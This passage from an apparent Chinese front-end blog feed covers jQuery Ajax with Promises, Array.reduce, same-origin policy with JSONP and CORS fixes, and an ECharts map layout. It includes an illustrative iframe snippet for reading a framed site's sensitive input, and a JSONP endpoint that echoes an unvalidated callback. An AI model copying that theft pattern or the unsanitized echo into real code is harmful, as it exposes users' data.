title="配合Promise使用"></a>配合Promise使用</h2><p>需掌握客户端模板引擎（ZP-P93-Promise使用场景）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = &#123;&#125;</span><br><span class="line">$.<span class="keyword">get</span>('http://127.0.0.1:3000/users/4')</span><br><span class="line">  .then(function (user) &#123;</span><br><span class="line">    data.user = user</span><br><span class="line">    <span class="keyword">return</span> $.<span class="keyword">get</span>('http://127.0.0.1:3000/jobs')</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(function (jobs) &#123;</span><br><span class="line">    data.jobs = jobs</span><br><span class="line">    <span class="keyword">var</span> htmlStr = template(<span class="string">'tpl'</span>, data)</span><br><span class="line">    <span class="built_in">document</span>.querySelector(<span class="string">'#user_form'</span>).innerHTML = htmlStr</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><h3 id="各参数含义"><a href="#各参数含义" class="headerlink" title="各参数含义"></a>各参数含义</h3><blockquote><p>参考文档： <a href="https://www.w3school.com.cn/jquery/ajax_ajax.asp" target="_blank" rel="noopener">w3school</a> </p></blockquote><ul><li><p>url    </p><p>类型：String </p><p>默认值: 当前页地址</p><p>发送请求的地址。</p></li><li><p>type</p><p>类型：String</p><p>默认值: “GET”)。</p><p>请求方式 (“POST” 或 “GET”)， 默认为 “GET”。其它 HTTP 请求方法，如 PUT 和 DELETE 也可以使用，但仅部分浏览器支持。</p></li><li><p>success</p><p>类型：Function</p><p>请求成功后的回调函数。</p><p>参数：由服务器返回，并根据 dataType 参数进行处理后的数据；描述状态的字符串。</p><p>这是一个 Ajax 事件。</p></li><li><p>dataType</p><p>类型：String</p><p>预期服务器返回的数据类型。如果不指定，jQuery 将自动根据 HTTP 包 MIME 信息来智能判断，比如 XML MIME 类型就被识别为 XML。在 1.4 中，JSON 就会生成一个 JavaScript 对象，而 script 则会执行这个脚本。随后服务器端返回的数据会根据这个值解析后，传递给回调函数。可用值:</p><ul><li>“xml”: 返回 XML 文档，可用 jQuery 处理。</li><li>“html”: 返回纯文本 HTML 信息；包含的 script 标签会在插入 dom 时执行。</li><li>“script”: 返回纯文本 JavaScript 代码。不会自动缓存结果。除非设置了 “cache” 参数。注意：在远程请求时(不在同一个域下)，所有 POST 请求都将转为 GET 请求。（因为将使用 DOM 的 script标签来加载）</li><li>“json”: 返回 JSON 数据 。</li><li>“jsonp”: JSONP 格式。使用 JSONP 形式调用函数时，如 “myurl?callback=?” jQuery 将自动替换 ? 为正确的函数名，以执行回调函数。</li><li>“text”: 返回纯文本字符串</li></ul></li><li><p>data</p><p>类型：String</p><p>发送到服务器的数据。将自动转换为请求字符串格式。GET 请求中将附加在 URL 后。查看 processData 选项说明以禁止此自动转换。必须为 Key/Value 格式。如果为数组，jQuery 将自动为不同值对应同一个名称。如 {foo:[“bar1”, “bar2”]} 转换为 ‘&amp;foo=bar1&amp;foo=bar2’。</p></li></ul><h1 id="数组reduce函数"><a href="#数组reduce函数" class="headerlink" title="数组reduce函数"></a>数组reduce函数</h1><p><strong>【数组的reduce方法】：</strong></p><ol><li><p>reduce方法接收一个函数作为累加器（“连续操作器”）。</p></li><li><p>数组中的每个值（从左到右）开始合并（不一定是相加！），最终为一个值。</p></li><li><p>reduce为数组中的每一个元素【依次执行】回调函数，但不包括数组中被删除或从未被赋值的元素。</p></li><li><p>reduce方法最终返回的是最后一次调用累加器的结果。</p></li><li><p>累加器函数接受四个参数：preValue, nowValue, nowIndex, arr</p></li></ol><p><strong>参数说明：</strong></p><p><code>array.reduce(function(preValue, nowValue, nowIndex, arr){}, initialValue)</code></p><ul><li>preValue：第一次调用时是初始值，如果初始值没有指定，就是数组中第一个元素的值，同时nowValue变为数组中的第二个值。以后调用时是上一次该回调函数的返回值；</li><li>nowValue：当前元素值；</li><li>nowIndex：当前索引；</li><li>arr：调用 reduce 的数组；</li></ul><p><strong>注意：</strong></p><ol><li>如果initialValue在调用时被提供，那么第一次的preValue就等于initialValue，nowValue等于数组中的第一个值；</li><li>如果initialValue未被提供，那么preValue等于数组中的第一个值，nowValue自动等于数组中的第二个值。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> abc = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = abc.reduce(<span class="function"><span class="keyword">function</span>(<span class="params">preValue, nowValue, nowIndex, arr</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(preValue)</span><br><span class="line">    <span class="comment">// console.log(nowValue)</span></span><br><span class="line">    <span class="comment">// console.log(nowIndex)</span></span><br><span class="line">    <span class="comment">// console.log(arr)</span></span><br><span class="line">    <span class="keyword">return</span> preValue + nowValue</span><br><span class="line">&#125;,<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(result) <span class="comment">//结果为1021</span></span><br></pre></td></tr></table></figure><h1 id="跨域问题总结"><a href="#跨域问题总结" class="headerlink" title="跨域问题总结"></a>跨域问题总结</h1><h2 id="跨域产生的原因"><a href="#跨域产生的原因" class="headerlink" title="跨域产生的原因"></a>跨域产生的原因</h2><p>浏览器为了安全，而采用的同源策略（Same origin policy）</p><h2 id="同源策略含义"><a href="#同源策略含义" class="headerlink" title="同源策略含义"></a>同源策略含义</h2><ol><li>同源策略是由Netscape提出的一个著名的安全策略，现在所有支持JavaScript 的浏览器都会使用这个策略。</li><li>Web是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。</li><li>所谓同源是指：协议，域名（IP），端口必须要完全相同<br>即：协议、域名（IP）、端口都相同，才能算是在同一个域里。</li><li>同源策略产生的问题<ul><li>Cookie不能读取</li><li>DOM无法获得</li><li>Ajax请求不能发送</li></ul></li></ol><h2 id="没有同源策略的危害："><a href="#没有同源策略的危害：" class="headerlink" title="没有同源策略的危害："></a>没有同源策略的危害：</h2><p>用户信息可能被盗用，导致财产损失以及隐私泄露，不法分子会利用<code>iframe</code>标签获取正规网站的ui界面，然后通过后台服务器去截取用户信息，代码大致如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"baidu"</span> <span class="attr">src</span>=<span class="string">"https://www.baidu.com"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> iframe = <span class="built_in">window</span>.frames[<span class="string">'baidu'</span>]</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> hhh = iframe.document.getElementById(<span class="string">'输入敏感信息的input的id'</span>)</span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(hhh.value)</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="解决跨域问题："><a href="#解决跨域问题：" class="headerlink" title="解决跨域问题："></a>解决跨域问题：</h2><h3 id="JSONP解决发送请求跨域问题："><a href="#JSONP解决发送请求跨域问题：" class="headerlink" title="JSONP解决发送请求跨域问题："></a>JSONP解决发送请求跨域问题：</h3><blockquote><p>JSONP是利用了标签请求资源不受同源策略限制的特点<br>JSONP需要前后端人员互相配合。</p></blockquote><p>前端页面写法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"btn"</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">'btn'</span>);</span></span><br><span class="line"><span class="actionscript">    btn.onclick = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">      <span class="comment">//1. 创建一个script标签</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="comment">//2. 设置回调函数</span></span></span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.getData = <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(data);<span class="comment">//拿到数据</span></span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="actionscript">      <span class="comment">//3. 设置script标签src属性，填写跨域请求的地址</span></span></span><br><span class="line"><span class="actionscript">      script.src = <span class="string">'http://localhost:3000/jsonp?callback=getData'</span>;</span></span><br><span class="line"><span class="actionscript">      <span class="comment">//4. 将script标签添加到body中生效</span></span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.body.appendChild(script);</span></span><br><span class="line"><span class="actionscript">      <span class="comment">//5.不影响整体DOM结构，删除script标签</span></span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.body.removeChild(script);</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>后端写法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/jsonp'</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">//解构赋值获取请求参数</span></span><br><span class="line">  <span class="keyword">const</span> &#123;callback&#125; = req.query</span><br><span class="line">  <span class="comment">//去数据库查找对应数据</span></span><br><span class="line">  <span class="keyword">const</span> data = [&#123;<span class="attr">name</span>: <span class="string">'tom'</span>, <span class="attr">age</span>: <span class="number">18</span>&#125;, &#123;<span class="attr">name</span>: <span class="string">'jerry'</span>, <span class="attr">age</span>: <span class="number">20</span>&#125;];</span><br><span class="line">  res.send(callback + <span class="string">'('</span> + <span class="built_in">JSON</span>.stringify(data) + <span class="string">')'</span>); <span class="comment">//数据格式转换问题</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="后台配置cors解决跨域"><a href="#后台配置cors解决跨域" class="headerlink" title="后台配置cors解决跨域"></a>后台配置cors解决跨域</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//允许哪个url访问自己</span></span><br><span class="line">res.set(<span class="string">'Access-Control-Allow-Origin'</span>, <span class="string">'http://localhost:63342'</span>);</span><br></pre></td></tr></table></figure><h3 id="使用代理服务器"><a href="#使用代理服务器" class="headerlink" title="使用代理服务器"></a>使用代理服务器</h3><p><a href="https://blog.csdn.net/qqfo24/article/details/81383986" target="_blank" rel="noopener">nginx</a>等</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> Ajax </tag>
            
            <tag> JQuery </tag>
            
            <tag> Promise </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Echarts</title>
      <link href="/2020/07/20/Echarts/"/>
      <url>/2020/07/20/Echarts/</url>
      
        <content type="html"><![CDATA[<h1 id="静态地图布局设计"><a href="#静态地图布局设计" class="headerlink" title="静态地图布局设计"></a>静态地图布局设计</h1><blockquote><p>这一节的教程是基于b站<a href="https://www.bilibili.com/video/BV1v7411R7mp" target="_blank" rel="noopener">pink老师</a>的教程进行记录的，感兴趣的可以点过去学习一波</p></blockquote><p>案例——ECharts</p><p>前期准备工作，搭建项目文件夹存储对应文件</p><h2 id="所需技术"><a href="#所需技术" class="headerlink" title="所需技术"></a>所需技术</h2><ol><li><p>css布局</p></li><li><p>flex布局</p><ul><li><p>引用flex文件，下载地址：<a href="https://github.com/amfe/lib-flexible，之后在页面引用index.js文件(修改名字更佳)" target="_blank" rel="noopener">https://github.com/amfe/lib-flexible，之后在页面引用index.js文件(修改名字更佳)</a></p></li><li><p>设置分配大小</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// set 1rem = viewWidth / 10</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">setRemUnit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">var</span> rem = docEl.clientWidth / <span class="number">24</span>; <span class="comment">//设置平均分24等分</span></span><br><span class="line">   docEl.style.fontSize = rem + <span class="string">"px"</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li><li><p>设置样式，浏览器控制台验证是否生效</p></li></ul></li><li><p>原生js+JQuery</p></li><li><p>rem适配（px转rem）</p><ul><li><p>sublime安装插件，下载地址<a href="https://gitee.com/selience/Sublime-cssrem-plugin.git" target="_blank" rel="noopener">https://gitee.com/selience/Sublime-cssrem-plugin.git</a></p></li><li><p>打开sublime插件目录</p></li><li><p>将下载的插件包复制进该文件夹</p></li><li><p>打开sublime，首选项→package Settions→cssrem→设置，本来打算在这两个文件设置相应配置，但失败了（懒得研究）</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/Echarts/image-20200616210129279.png" alt="image-20200616210129279"></p></li><li><p>在插件文件夹打开Sublime-cssrem-plugin，路径→Sublime Text 3\Packages\Sublime-cssrem-plugin，修改设置</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/Echarts/image-20200616205943772.png" alt="image-20200616205943772"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"px_to_rem"</span>: <span class="number">80</span>, <span class="comment">//设置80px转1rem</span></span><br><span class="line">    <span class="string">"max_rem_fraction_length"</span>: <span class="number">6</span>,</span><br><span class="line">    <span class="string">"available_file_types"</span>: [<span class="string">".css"</span>, <span class="string">".less"</span>, <span class="string">".sass"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h2 id="页面布局"><a href="#页面布局" class="headerlink" title="页面布局"></a>页面布局</h2><h3 id="页面HTML文件"><a href="#页面HTML文件" class="headerlink" title="页面HTML文件"></a>页面HTML文件</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>中国疫情地图<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--     &lt;link rel="stylesheet" href="Bootstrap/css/bootstrap.min.css"&gt; --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--     &lt;script src="Bootstrap/js/bootstrap.min.js"&gt;&lt;/script&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/echarts.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- arcgis模块 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://js.arcgis.com/4.15/esri/themes/light/main.css"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://js.arcgis.com/4.15/"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/jquery.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/index.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span> 中国疫情地图 <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"showTime"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 这里是时间函数，下面有 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">"mainbox"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 左 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"column"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel bar"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>各省疫情状况<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"chart"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panelFooter"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>各省疫情状况<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"chart"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panelFooter"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>各省疫情状况<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"chart"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panelFooter"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 中 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"column"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 上模块 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"no"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"no-hd"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span>12566<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span>10000<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"no-bd"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span>当前确诊人数<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span>累计确诊人数<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 地图模块 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"map"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"map1"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"map2"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"map3"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"chart"</span> <span class="attr">id</span>=<span class="string">"viewDiv"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 右 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"column"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>各省疫情状况<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"chart"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panelFooter"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>各省疫情状况<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"chart"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panelFooter"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>各省疫情状况<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"chart"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panelFooter"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/flexible.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;script src="js/echarts.min.js"&gt;&lt;/script&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/index.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="页面初始化"><a href="#页面初始化" class="headerlink" title="页面初始化"></a>页面初始化</h3><figure 